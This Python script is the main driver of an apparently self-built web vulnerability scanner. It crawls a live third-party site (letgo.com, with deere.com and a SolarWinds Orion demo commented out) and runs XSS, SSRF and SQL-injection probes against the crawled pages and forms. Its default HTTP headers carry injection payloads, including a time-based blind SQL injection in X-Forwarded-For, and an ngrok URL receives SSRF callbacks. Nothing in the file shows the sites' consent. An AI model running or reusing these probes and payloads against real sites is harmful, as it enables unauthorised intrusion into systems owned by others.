from tldextract import tldextract

from Managers.CookieManager import CookieManager
from Managers.Hakrawler import Hakrawler
from Managers.LinksManager import LinksManager
from Managers.FormRequestFetcher import FormRequestFetcher
from Managers.SqliManager import SqliManager
from Managers.SsrfManager import SsrfManager
from Managers.XssManager import XssManager

headers = {
    'Cache-Control': 'max-age=0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'X-Forwarded-For': 'XOR(if(1=1,sleep(5),0))OR',
    'X-API-KEY': 'xapikeypoc\'',
}


def main():

    # start_url = "https://www.deere.com/en/mowers/lawn-tractors/"
    # start_url = "https://oriondemo.solarwinds.com/Orion/SummaryView.aspx?ViewID=1"
    start_url = "https://www.letgo.com/en-tr"
    ngrok_url = 'http://5f47-91-196-101-94.ngrok.io/'
    domain_parts = tldextract.extract(start_url)
    domain = domain_parts.domain + '.' + domain_parts.suffix

    cookieManager = CookieManager(domain)
    raw_cookie = cookieManager.get_raw_cookies()

    hakrawler = Hakrawler(domain, raw_cookie)
    get_dtos = hakrawler.get_requests_dtos(start_url)

    cookies_dict = cookieManager.get_cookies_dict(raw_cookie)
    # linksManager = LinksManager(domain, cookies_dict, headers)
    # get_dtos = linksManager.get_all_links(start_url)

    post_manager = FormRequestFetcher(domain)
    post_dtos = post_manager.get_all_post_requests(get_dtos)

    xss_manager = XssManager(domain, cookies_dict, headers)
    xss_manager.check_get_requests(get_dtos)
    xss_manager.check_form_requests(post_dtos)

    ssrf_manager = SsrfManager(domain, cookies_dict, headers, ngrok_url)
    ssrf_manager.check_get_requests(get_dtos)
    ssrf_manager.check_form_requests(post_dtos)

    sqli_manager = SqliManager(domain, cookies_dict, headers)
    sqli_manager.check_get_requests(get_dtos)


if __name__ == '__main__':
    main()
